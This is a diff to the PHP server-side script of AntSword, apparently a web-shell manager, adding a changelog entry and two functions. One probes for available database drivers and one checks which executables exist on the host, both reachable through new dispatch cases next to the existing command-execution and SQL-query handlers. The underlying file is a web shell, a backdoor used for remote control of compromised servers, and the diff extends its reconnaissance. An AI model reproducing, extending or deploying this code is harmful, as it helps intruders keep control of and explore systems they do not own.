@@ -14,7 +14,7 @@
 * ———————————————————————————————————————————————
 *
 * 使用说明：
-*  1. AntSword >= v1.1-dev
+*  1. AntSword >= v2.0.7
 *  2. 创建 Shell 时选择 custom 模式连接
 *  3. 数据库连接：
 *    <H>localhost</H>
@@ -24,7 +24,11 @@
 *  4. 本脚本中 encoder 与 AntSword 添加 Shell 时选择的 encoder 要一致，如果选择 default 则需要将 encoder 值设置为空
 *
 * ChangeLog:
-*   Data: 2016/05/13 v1.1
+*   Date: 2019/04/05 v1.2
+*    1. 新增 listcmd 接口
+*    2. 新增数据库支持函数检查接口
+*
+*   Date: 2016/05/13 v1.1
 *    1. 执行 DML 语句，显示执行状态
 *
 *   Date: 2016/04/06 v1.0
@@ -336,6 +340,33 @@ function ExecuteCommandCode($cmdPath, $command){
     return ($ret!=0)?"ret={$ret}":"";
 }
 
+function probedb(){
+    $ret="";
+    $m=array(
+        'mysql_close','mysqli_close','mssql_close','sqlsrv_close','ora_close','oci_close',
+        'ifx_close','sqlite_close','pg_close','dba_close','dbmclose','filepro_fieldcount',
+        'sybase_close'
+    );
+    foreach ($m as $f) {
+        $ret.=($f."\t".(function_exists($f)?'1':'0')."\n");
+    }
+    if(function_exists('pdo_drivers')){
+      foreach(@pdo_drivers() as $f){
+        $ret.=("pdo_".$f."\t1\n");
+      }
+    }
+    return $ret;
+}
+
+function listcmd($binarr){
+    $ret="";
+    $arr=@explode(",", $binarr);
+    foreach($arr as $v){
+        $ret.=($v."\t".(@file_exists($v)?"1":"0")."\n");
+    }
+    return $ret;
+}
+
 @ini_set("display_errors", "0");
 @set_time_limit(0);
 @set_magic_quotes_runtime(0);
@@ -401,6 +432,12 @@ try {
             break;
         case 'Q':
             $ret = query($z0, $z1, $z2);
+            break;
+        case 'Y':
+            $ret = listcmd($z1);
+            break;
+        case 'Z':
+            $ret = probedb();
             break;
         default:
             // $ret = "Wrong Password";
